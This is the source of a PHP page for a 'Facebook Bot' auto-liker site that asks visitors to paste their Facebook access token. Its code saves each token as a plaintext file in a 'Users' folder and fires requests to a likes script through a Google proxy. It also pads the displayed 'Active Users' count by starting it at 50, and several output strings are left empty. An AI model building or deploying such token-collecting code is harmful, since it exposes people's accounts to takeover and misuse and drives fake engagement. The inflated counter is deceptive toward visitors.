<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Latest Facebook Bot Site By Husnain</title>
	<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
</head>
<body>
	<nav class="navbar navbar-inverse navbar-fixed-top">
		<div class="container-fluid">
			<div class="navbar-header">
				<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar">
					<span class="sr-only">Toggle Navigation</span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
				</button>
				<a href="#" class="navbar-brand"><i class="fas fa-users"></i> Faceboook Bot</a>
			</div>
			     <div class="navbar-collapse collapse" id="navbar">
				<ul class="nav navbar-nav">
					<li><a href="index.php"><strong><i class="fas fa-tachometer-alt"></i> Dashboard</strong></a></li>
					<li><a href="https://www.youtube.com/Husnainhaxor   " target="_blank"><strong><i class="fab fa-youtube-square"></i> YouTube</strong></a></li>
					<li><a href="//facebook.com/ myviralhax    " target="_blank"><strong><i class="fab fa-facebook-square"></i> Facebook</strong></a></li>
					<li><a href="//instagram.com/mrhasni    " target="_blank"><strong><i class="fab fa-instagram"></i> Instagram</strong></a></li>
					<li><a href="//myviralhax.com" target="_blank"><strong><i class="fab fa-blogger"></i> Blog</strong></a></li>
				</ul>
                        <!-- Right Navigation Bar Button -->
				<ul class="nav navbar-nav navbar-right">
					<li><a href="    " target="_blank"><strong><i class="fab       "></i> Messenger</strong></a></li>
				</ul>
			</div>
		</div>
	</nav>
    <br><br>

    <br><br>
	  

	   <?php
$yx=opendir('Users');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> Users($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function Users($access){
if(!is_dir('Users')){
mkdir('Users');
}
$a=fopen('Users/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<script>window.alert("Your Token is Invalid, Try Again :)");</script>';
$this->form();
}
public function form(){
 echo '';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
  <script>window.alert("Your Bot Has been Successfully Logged in :)");</script>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>

  <div class="container-fluid">
  	<div class="panel panel-success">
  		<div class="panel-heading"><center><h5><i class="fas fa-check"></i> [17-05-18] Completely Fixed By <strong>Myviralhax</strong></h5></center></div>
  	</div>
  </div>
  
  <div class="container-fluid">
  	<div class="panel panel-warning">
  		<div class="panel-heading"><center><h5><i class="fas fa-robot"></i> Free Facebook Auto Robot Service.</h5></center></div>
  	</div>
  </div>
          <!-- Login Area for USer -->
  <div class="container">
  	<div class="panel panel-primary">
  		<div class="panel-heading">
  			<h4><center><i class="fas fa-sign-in-alt"></i> Paste Your Token to Login</center></h4>
  		</div>
  		  <div class="panel-body">
  		  	<center>
  		  	 <form action="" method="POST" class="form-group">
<div class="form-group">
  <label for="usr">Paste Your Token:</label>
  <input type="text" class="form-control" id="usr" name="access_token" placeholder="Paste Your Token Here to Login"> <br>
  <input class="submit btn btn-success" value="Login" type="submit" name="saveFile" style="height:34px; width: 80px; border: none;">
           <!-- Get Token -->
  <a href="//tipu-token.tk" target="_blank" class="btn btn-info">Get Token</a>
</div>

</form></center>
  		  </div>
  		  <div class="panel-footer">
  		  	 <h4><center>Thanks For Using Our Bot</center></h4>
  		  </div>
  	</div>
  </div>

 

  <br>
   

    <div class="container">
    	<div class="panel panel-danger">
    		<div class="panel-heading"><h4><center><i class="fab fa-creative-commons-by"></i> Currently Active Users</center></h4></div>

    		<div class="panel-body">
    			<!-- Users Start -->
    			<h2>
	
<center><font size="5" color="black"><?php 
    // integer starts at 50 before counting
    $i = 50; 
    $dir = 'Users/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // prints out how many were in the directory
     echo "Active Users : $i";
?><br></font></p></h2>
                 <!-- Users End -->
    		</div>
    	</div>
    </div>

      <!--Footer Links-->
    <div class="container-fluid text-center text-md-left" style="background-color: black;">
        <div class="row">

            <!--First column-->
            <div class="col-md-6">
                <h5 class="text-uppercase" style="color: white;">Muhammad Husnain</h5>
                <p style="color: white;"><i>A Free and Latest Facebook Bot Service by Myviralhax.com </i></p>
            </div>
            <!--/.First column-->

            <!--Second column-->
            <div class="col-md-6">
                <h5 class="text-uppercase" style="color: white;">Contact Us</h5>
                <ul class="list-unstyled">
                	<strong>
                    <li>
                        <a href="//facebook.com/myviralhax     " target="_blank" style="text-decoration: none;"><i class="fab fa-facebook-square"></i> Facebook</a>
                    </li>
                    <li>
                        <a href="// instagram.com/mrhasni      " target="_blank" style="text-decoration: none;"><i class="fab fa-instagram"></i> Instagram</a>
                    </li>
                    <li>
                        <a href="//youtube.com/Husnainhaxor     " target="_blank" style="text-decoration: none;"><i class="fab fa-youtube-square"></i> YouTube</a>
                    </li>
                    <li>
                        <a href="//www.myviralhax.com     " target="_blank" style="text-decoration: none;"><i class="fab fa-blogger"></i> Blog</a>
                    </li></strong>
                </ul>
            </div>
            <!--/.Second column-->
        </div>
    </div>
    <!--/.Footer Links-->

    <!--Copyright-->
    <div class="footer-copyright py-3 text-center">
       <strong> © 2018 Copyright:</strong>
        <a href="//www.tipubot.top" target="_blank"> <strong>myviralhax.com </strong></a>
    </div>
    <!--/.Copyright-->

</footer>
<!--/.Footer-->
</body>
</html>